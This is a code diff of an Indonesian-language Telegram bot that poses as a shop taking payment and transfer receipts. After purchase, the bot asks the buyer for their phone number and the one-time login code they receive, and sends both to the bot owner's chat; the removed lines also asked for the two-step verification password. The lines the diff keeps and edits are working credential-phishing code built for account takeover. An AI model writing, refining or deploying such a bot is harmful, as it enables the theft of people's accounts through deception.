@@ -107,8 +107,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "konfirmasi_produk":
         buttons = [[InlineKeyboardButton(p["nama"], callback_data=f"metode_{i}")] for i, p in enumerate(metode_pembayaran)]
+        buttons.append([InlineKeyboardButton("⬅️ Kembali", callback_data="beli")])
         await query.edit_message_text("Pilih metode pembayaran:", reply_markup=InlineKeyboardMarkup(buttons))
-        return KIRIM_BUKTI
+        return METODE_BAYAR
 
     elif data.startswith("metode_"):
         idx = int(data.split("_")[1])
@@ -119,7 +120,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return KIRIM_BUKTI
 
     elif data == "kirim_bukti":
-        await query.edit_message_text("Silakan kirim ss bukti transfer.")
+        await query.edit_message_text("Silakan kirim bukti transfer berupa foto.")
         return KIRIM_BUKTI
 
 async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -135,7 +136,7 @@ async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("❌ Tolak", callback_data=f"owner_tolak_{user_id}")]
         ]
         await context.bot.send_photo(chat_id=OWNER_ID, photo=file_id, caption=caption, reply_markup=InlineKeyboardMarkup(buttons))
-        await update.message.reply_text("Bukti berhasil dikirim. Tunggu konfirmasi admin ya kak.")
+        await update.message.reply_text("Bukti berhasil dikirim. Tunggu konfirmasi admin ya.")
         return INPUT_NOHP
     else:
         await update.message.reply_text("Hanya foto yang diterima.")
@@ -161,18 +162,17 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if "nohp" not in user_data_store[uid]:
         user_data_store[uid]["nohp"] = text
-        await update.message.reply_text("✅ Nomor HP diterima, silakan kirim OTP yang telah Anda terima kirim pakai spasi ya.")
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 No HP dari @{update.message.from_user.username or uid}: {text}")
+        await update.message.reply_text("✅ Nomor HP diterima, silakan kirim OTP yang telah Anda terima.")
+        await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 Nomor HP {text} dari @{update.message.from_user.username}")
         return INPUT_OTP
-    elif "otp" not in user_data_store[uid]:
+
+    if "otp" not in user_data_store[uid]:
         user_data_store[uid]["otp"] = text
-        await update.message.reply_text("✅ OTP diterima, silakan kirim verifikasi 2 langkah jika tidak ada ketik skip.")
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"🔐 OTP dari @{update.message.from_user.username or uid}: {text}")
+        await update.message.reply_text("✅ OTP diterima. Menunggu verifikasi.")
+        await context.bot.send_message(chat_id=OWNER_ID, text=f"📲 OTP {text} dari @{update.message.from_user.username}")
         return INPUT_VERIFIKASI
-    else:
-        user_data_store[uid]["verifikasi"] = text
-        await update.message.reply_text("Terimakasih Atas pembeliannya. Proses selesai.")
-        return ConversationHandler.END
+
+    return ConversationHandler.END
 
 def main():
     application = ApplicationBuilder().token(TOKEN).build()
